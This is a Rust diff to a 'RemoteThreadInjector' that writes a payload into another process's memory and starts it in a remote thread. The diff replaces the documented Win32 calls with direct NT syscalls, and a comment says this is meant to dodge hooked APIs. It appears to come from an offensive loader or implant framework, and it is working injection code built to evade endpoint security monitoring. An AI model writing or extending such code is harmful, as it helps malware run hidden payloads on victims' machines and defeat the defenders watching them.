@@ -16,67 +16,92 @@ impl Injector for RemoteThreadInjector {
             ));
         }
 
-        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
-        use winapi::um::processthreadsapi::OpenProcess;
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
         use winapi::um::winnt::{PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
 
+        // Open target process via NtOpenProcess
+        let mut client_id = [0u64; 2];
+        client_id[0] = pid as u64;
+        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+
         unsafe {
-            let h_proc = OpenProcess(
-                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
-                0,
-                pid,
+            let mut h_proc: usize = 0;
+            let access_mask = (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD) as u64;
+            let open_status = nt_syscall::syscall!(
+                "NtOpenProcess",
+                &mut h_proc as *mut _ as u64,
+                access_mask,
+                &mut obj_attr as *mut _ as u64,
+                client_id.as_mut_ptr() as u64,
             );
-            if h_proc.is_null() {
-                return Err(anyhow!("RemoteThread: OpenProcess failed"));
+            match open_status {
+                Ok(s) if s >= 0 && h_proc != 0 => {}
+                _ => return Err(anyhow!("RemoteThread: NtOpenProcess failed")),
+            }
+            let h_proc = h_proc as *mut std::ffi::c_void;
+
+            macro_rules! close_h {
+                ($h:expr) => {
+                    nt_syscall::syscall!("NtClose", $h as u64).ok();
+                };
+            }
+            macro_rules! cleanup_and_err {
+                ($msg:expr) => {{
+                    close_h!(h_proc);
+                    return Err(anyhow!($msg));
+                }};
             }
 
             // Allocate RW first; switch to RX after writing to avoid RWX pages
-            let remote_mem = VirtualAllocEx(
-                h_proc,
-                std::ptr::null_mut(),
-                payload.len(),
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
+            let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
+            let mut alloc_size = payload.len();
+            let s = nt_syscall::syscall!(
+                "NtAllocateVirtualMemory",
+                h_proc as u64, &mut remote_mem as *mut _ as u64,
+                0u64, &mut alloc_size as *mut _ as u64,
+                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
             );
+            match s {
+                Ok(st) if st >= 0 => {}
+                _ => cleanup_and_err!("RemoteThread: NtAllocateVirtualMemory failed"),
+            }
             if remote_mem.is_null() {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("RemoteThread: VirtualAllocEx failed"));
+                cleanup_and_err!("RemoteThread: NtAllocateVirtualMemory returned null");
             }
 
             let mut written = 0usize;
-            if WriteProcessMemory(
-                h_proc,
-                remote_mem,
-                payload.as_ptr() as _,
-                payload.len(),
-                &mut written,
-            ) == 0
-            {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("RemoteThread: WriteProcessMemory failed"));
+            let s = nt_syscall::syscall!(
+                "NtWriteVirtualMemory",
+                h_proc as u64, remote_mem as u64,
+                payload.as_ptr() as u64, payload.len() as u64,
+                &mut written as *mut _ as u64,
+            );
+            match s {
+                Ok(st) if st >= 0 => {}
+                _ => cleanup_and_err!("RemoteThread: NtWriteVirtualMemory failed"),
             }
             if written != payload.len() {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!(
-                    "RemoteThread: WriteProcessMemory wrote {} of {} bytes",
+                cleanup_and_err!(
+                    "RemoteThread: NtWriteVirtualMemory wrote {} of {} bytes",
                     written,
                     payload.len()
-                ));
+                );
             }
 
             // Switch to execute-read (no write)
             let mut old_prot = 0u32;
-            if VirtualProtectEx(
-                h_proc,
-                remote_mem,
-                payload.len(),
-                PAGE_EXECUTE_READ,
-                &mut old_prot,
-            ) == 0
-            {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!("RemoteThread: VirtualProtectEx to RX failed"));
+            let mut prot_base = remote_mem as usize;
+            let mut prot_size = payload.len();
+            let s = nt_syscall::syscall!(
+                "NtProtectVirtualMemory",
+                h_proc as u64, &mut prot_base as *mut _ as u64,
+                &mut prot_size as *mut _ as u64,
+                PAGE_EXECUTE_READ as u64, &mut old_prot as *mut _ as u64,
+            );
+            match s {
+                Ok(st) if st >= 0 => {}
+                _ => cleanup_and_err!("RemoteThread: NtProtectVirtualMemory to RX failed"),
             }
 
             // Use NtCreateThreadEx via pe_resolve to avoid the hooked CreateRemoteThread.
@@ -118,16 +143,15 @@ impl Injector for RemoteThreadInjector {
                 std::ptr::null_mut(),
             );
             if status < 0 {
-                pe_resolve::close_handle(h_proc);
-                return Err(anyhow!(
+                cleanup_and_err!(
                     "RemoteThread: NtCreateThreadEx failed: {:x}",
                     status
-                ));
+                );
             }
             if !h_thread.is_null() {
-                pe_resolve::close_handle(h_thread);
+                close_h!(h_thread);
             }
-            pe_resolve::close_handle(h_proc);
+            close_h!(h_proc);
         }
         Ok(())
     }
